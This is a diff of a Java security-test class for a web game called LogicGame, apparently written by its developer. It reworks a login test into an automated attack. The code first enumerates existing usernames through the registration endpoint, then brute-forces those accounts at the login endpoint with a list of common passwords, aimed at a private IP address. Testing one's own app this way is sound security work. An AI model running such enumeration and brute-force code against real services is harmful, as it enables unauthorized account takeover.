@@ -1,28 +1,15 @@
 package uy.com.uma.logicgame.fe.test.seguridad;
 
 import java.io.IOException;
-import java.io.InputStream;
-import java.io.OutputStream;
-import java.net.URL;
-import java.net.URLConnection;
-import java.net.URLEncoder;
-import java.nio.charset.StandardCharsets;
-import java.util.Scanner;
+import java.security.KeyException;
+import java.util.ArrayList;
+import java.util.Collection;
+import java.util.UUID;
 
-import javax.json.Json;
-import javax.json.JsonObject;
-import javax.json.JsonReader;
-
-import org.apache.tools.ant.filters.StringInputStream;
+import uy.com.uma.comun.util.EncriptadorString;
 
 /**
- * http://stackoverflow.com/questions/2793150/using-java-net-urlconnection-to-fire-and-handle-http-requests
- * https://www.mkyong.com/java/how-to-send-http-request-getpost-in-java/
- * http://stackoverflow.com/questions/18899232/how-to-parse-this-json-response-in-java
- * 
- * LOGIN_EXITOSO = 1
- * LOGIN_USUARIO_INEXISTENTE = 2
- * LOGIN_CLAVE_INCORRECTA = 3
+ * Lanza ataques contra el login del juego LogicGame
  * 
  * @author Santiago Dalchiele
  */
@@ -33,44 +20,75 @@ public class TestLoginAttack {
 	 */
 	public static void main(String[] args) {
 		
-		String url = "http://192.168.184.169:8080/lgweb/login.do";
-		String charset = StandardCharsets.ISO_8859_1.name();
-		String usuario = "admin";
-		String clave = "nolase";
-		Scanner scanner = null;
-		JsonReader reader = null;
+		final String urlBase = "http://192.168.184.169:8080/lgweb";
+		final String urlLogin = urlBase + "/login.do";
+		final String urlRegistro = urlBase + "/registro.do";		
+		final String idioma = "en";
+		final String [] claves = new String [] {"secret", "secreto", "secreta", "clave", "clave123", "adm1234", "qwer1234", "password",
+				"123456", "12345678", "qwerty", "12345", "dragon", "pussy", "baseball", "football"};
+		final String [] usuarios = new String [] {"admin", "administrador", "hugo", "diego", "jose", "pedro", "juan", "maria", "laura", "santiago",
+				"111111", "123456", "12345678", "abc123", "abramov", "account", "accounting"};
+		Collection<String> usuariosRegistrados = new ArrayList<String>();
+		LoginAttack la = new LoginAttack(urlLogin);
+		RegistroAttack ra = new RegistroAttack(urlRegistro);		
+		ra.setIdioma(idioma);
+		ra.setClave("clave");
 		
-		try {
-			String query = String.format("idUsuario=%s&clave=%s", 
-					URLEncoder.encode(usuario, charset), 
-					URLEncoder.encode(clave, charset));
-			System.out.println("Enviando un post a [" + url + "]");
-			URLConnection connection = new URL(url + "?" + query).openConnection();
-			connection.setDoOutput(true); // Triggers POST.
-			connection.setRequestProperty("Accept-Charset", charset);
-			connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded;charset=" + charset);
-
-			OutputStream output = connection.getOutputStream();
-			output.write(query.getBytes(charset));			
-			InputStream response = connection.getInputStream();			
-			scanner = new Scanner(response);
-		    String jsonResponse = scanner.useDelimiter("\\A").next();
-		    reader = Json.createReader(new StringInputStream(jsonResponse));
-		    JsonObject jsonObject = reader.readObject();		    
-		    int resultado = Integer.parseInt(jsonObject.getString("resultado"));
-		    
-		    if (resultado == 1) {
-		    	System.out.println("Login exitoso, usuario=[" + usuario + "] clave [" + clave + "]");
-		    } else if (resultado == 2)
-		    	System.out.println("El usuario [" + usuario + "] no existe");
-		    else if (resultado == 3)
-		    	System.out.println("El usuario ["+ usuario + "] existe");
+		try {			
+			for (String user : usuarios) {
+				ra.setUsuario(user);
+				ra.setCorreo(getRandomMail());
+				final int resultado = ra.doAttack();
+				
+				if (resultado == 0)
+			    	System.out.println("Error en parametros o conexion, usuario=[" + user + "] clave [" + ra.getClave() + 
+			    						"], idioma [" + ra.getIdioma() + "], correo [" + ra.getCorreo() + "]");
+			    else if (resultado == 1)
+			    	System.out.println("Registro exitoso, usuario=[" + user + "] clave [" + ra.getClave() + "]");
+			    else if (resultado == 4) {
+			    	System.out.println("El usuario [" + user + "] EXISTE !!!");
+			    	usuariosRegistrados.add(user);
+			    } else if (resultado == 5)
+			    	System.out.println("El correo ["+ ra.getCorreo() + "] EXISTE ???");
+			}
 			
-		} catch (IOException e) {
+			for (String usuario : usuariosRegistrados) {
+				for (String clave : claves) {
+					la.setUsuario(usuario);
+					la.setClave(clave);
+				    final int resultado = la.doAttack();
+				    
+				    if (resultado == 0)
+				    	System.out.println("Error en parametros o conexion, usuario=[" + usuario + "] clave [" + clave + "]");
+				    else if (resultado == 1) {
+				    	System.out.println("Login exitoso !!!!!!, usuario=[" + usuario + "] clave [" + clave + "]");
+				    	break;
+				    } else if (resultado == 2)
+				    	System.out.println("El usuario [" + usuario + "] no existe");
+				    else if (resultado == 3)
+				    	System.out.println("El usuario ["+ usuario + "] existe su clave NO es [" + clave + "]");
+				}
+			}
+		} catch (IOException | KeyException e) {
 			e.printStackTrace();
-		} finally {
-			try { if (reader != null) reader.close(); } catch (Exception e) {}
-			try { if (scanner != null) scanner.close(); } catch (Exception e) {}
 		}
+	}
+	
+	
+	
+	/**
+	 * Retorna un identificador de 32 caracteres elegido al azar
+	 */
+	private static String getRandomString32() throws KeyException {
+		return EncriptadorString.encripta(UUID.randomUUID().toString()).replace("=", "").replace("+", "").replace("/", "").substring(0, 32);
+	}
+	
+	
+	
+	/**
+	 * Retorna una dirección de correo válida armada al azar
+	 */
+	private static String getRandomMail() throws KeyException {
+		return getRandomString32() + "@" + getRandomString32() + ".com";
 	}
 }
